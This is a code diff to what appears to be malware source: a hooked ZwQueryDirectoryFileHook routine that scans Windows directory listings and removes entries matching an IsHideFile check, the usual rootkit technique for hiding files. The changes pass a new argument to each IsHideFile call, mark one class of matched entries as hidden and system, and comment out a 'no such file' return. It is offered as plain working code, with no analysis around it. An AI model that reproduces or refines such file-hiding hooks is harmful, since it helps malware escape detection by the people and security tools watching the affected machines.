@@ -82,9 +82,8 @@ NTSTATUS WINAPI ZwQueryDirectoryFileHook(  HANDLE  FileHandle, HANDLE  Event,
 												FileName, RestartScan );
 	
 	if ( Status != STATUS_SUCCESS )
-	{
 		return Status;
-	}
+
 
 	DWORD dwOffset = 0;
 	DWORD dwPr	   = 0;
@@ -106,7 +105,7 @@ NTSTATUS WINAPI ZwQueryDirectoryFileHook(  HANDLE  FileHandle, HANDLE  Event,
 				FileDirectoryInfo = (PFILE_DIRECTORY_INFORMATION)( (DWORD)FileInformation + dwOffset );
 				
 
-				if ( IsHideFile( FileDirectoryInfo->FileName, FileDirectoryInfo->FileNameLength ) )
+				if ( IsHideFile( FileDirectoryInfo->FileName, FileDirectoryInfo->FileNameLength, 1 ) )
 				{
 					if ( !FileDirectoryInfo->NextEntryOffset )
 					{
@@ -149,7 +148,7 @@ NTSTATUS WINAPI ZwQueryDirectoryFileHook(  HANDLE  FileHandle, HANDLE  Event,
 				FileFullDirectoryInfo = (PFILE_FULL_DIR_INFORMATION)( (DWORD)FileInformation + dwOffset );
 				
 
-				if ( IsHideFile( FileFullDirectoryInfo->FileName, FileFullDirectoryInfo->FileNameLength ) )
+				if ( IsHideFile( FileFullDirectoryInfo->FileName, FileFullDirectoryInfo->FileNameLength, 2 ) )
 				{
 					if ( !FileFullDirectoryInfo->NextEntryOffset )
 					{
@@ -178,6 +177,7 @@ NTSTATUS WINAPI ZwQueryDirectoryFileHook(  HANDLE  FileHandle, HANDLE  Event,
 			while ( FileFullDirectoryInfo->NextEntryOffset != 0 );
 		break;
 
+		//-------------------------------------------------
 		case FileBothDirectoryInformation:
 
 			FileBothDirectoryInfo = NULL;
@@ -192,8 +192,11 @@ NTSTATUS WINAPI ZwQueryDirectoryFileHook(  HANDLE  FileHandle, HANDLE  Event,
 				FileBothDirectoryInfo = (PFILE_BOTH_DIR_INFORMATION)( (DWORD)FileInformation + dwOffset );
 
 
-				if ( IsHideFile( FileBothDirectoryInfo->FileName, FileBothDirectoryInfo->FileNameLength ) )
+				if ( IsHideFile( FileBothDirectoryInfo->FileName, FileBothDirectoryInfo->FileNameLength, 3) )
 				{
+
+					FileBothDirectoryInfo->FileAttributes = FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN;
+
 					if ( !FileBothDirectoryInfo->NextEntryOffset )
 					{
 						if ( LastFileBothDirectoryInfo != NULL )
@@ -202,7 +205,7 @@ NTSTATUS WINAPI ZwQueryDirectoryFileHook(  HANDLE  FileHandle, HANDLE  Event,
 						}
 						else
 						{
-							Status = STATUS_NO_SUCH_FILE;
+//							Status = STATUS_NO_SUCH_FILE;
 						}
 					}
 					else if ( LastFileBothDirectoryInfo != NULL )
@@ -219,7 +222,12 @@ NTSTATUS WINAPI ZwQueryDirectoryFileHook(  HANDLE  FileHandle, HANDLE  Event,
 				dwOffset += FileBothDirectoryInfo->NextEntryOffset;
 			}
 			while ( FileBothDirectoryInfo->NextEntryOffset != 0 );
+
 		break;
+		//-------------------------------------------------
+
+
+
 
 		case FileNamesInformation:
 
@@ -234,7 +242,7 @@ NTSTATUS WINAPI ZwQueryDirectoryFileHook(  HANDLE  FileHandle, HANDLE  Event,
 
 				FileNamesInfo = (PFILE_NAME_INFORMATION)( (DWORD)FileInformation + dwOffset );
 
-				if ( IsHideFile( FileNamesInfo->FileName, FileNamesInfo->FileNameLength ) )
+				if ( IsHideFile( FileNamesInfo->FileName, FileNamesInfo->FileNameLength, 4 ) )
 				{
 					if ( !FileNamesInfo->NextEntryOffset )
 					{
@@ -276,7 +284,7 @@ NTSTATUS WINAPI ZwQueryDirectoryFileHook(  HANDLE  FileHandle, HANDLE  Event,
 
 				FileIdBothDirInfo  = (PFILE_ID_BOTH_DIR_INFORMATION)( (DWORD)FileInformation + dwOffset );
 
-				if ( IsHideFile( FileIdBothDirInfo->FileName, FileIdBothDirInfo->FileNameLength ) )
+				if ( IsHideFile( FileIdBothDirInfo->FileName, FileIdBothDirInfo->FileNameLength, 5 ) )
 				{
 					if ( !FileIdBothDirInfo->NextEntryOffset )
 					{
